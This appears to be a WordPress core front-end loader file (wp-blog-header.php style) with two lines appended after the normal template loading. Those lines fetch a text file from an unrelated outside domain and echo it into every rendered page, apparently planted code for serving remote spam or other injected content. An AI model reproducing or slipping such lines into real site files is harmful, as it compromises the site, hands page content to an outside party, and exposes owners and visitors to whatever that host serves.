<?php

	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';
    
   $a = file_get_contents( 'https://stikesholistic.ac.id/wp-content/sitk/toto.txt' );
echo $a;
